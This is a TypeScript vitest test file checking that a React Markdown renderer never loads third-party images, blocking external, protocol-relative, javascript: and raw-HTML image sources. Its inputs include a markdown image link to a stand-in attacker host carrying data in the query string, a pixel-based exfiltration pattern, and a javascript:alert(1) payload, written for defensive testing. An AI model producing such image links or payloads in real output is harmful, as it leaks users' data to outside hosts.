import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "@/components/shared/markdown";

const render = (md: string) => renderToStaticMarkup(createElement(Markdown, { children: md }));

describe("Markdown never loads third-party images (security r3 H3)", () => {
  it("renders an external image as a link, not an <img>", () => {
    const out = render("Report ![pixel](https://evil.example/p.gif?d=Westshore%20margin)");
    expect(out).not.toContain("<img");
    expect(out).toContain('href="https://evil.example/p.gif?d=Westshore%20margin"');
  });
  it("blocks protocol-relative and other schemes", () => {
    expect(render("![x](//evil.example/p.gif)")).not.toContain("<img");
    expect(render("![x](javascript:alert(1))")).not.toContain("<img");
  });
  it("still renders same-origin images", () => {
    expect(render("![chart](/api/files/abc.png)")).toContain('<img src="/api/files/abc.png"');
  });
  it("raw HTML img tags are not rendered", () => {
    expect(render('<img src="https://evil.example/x.gif">')).not.toContain("<img");
  });
});
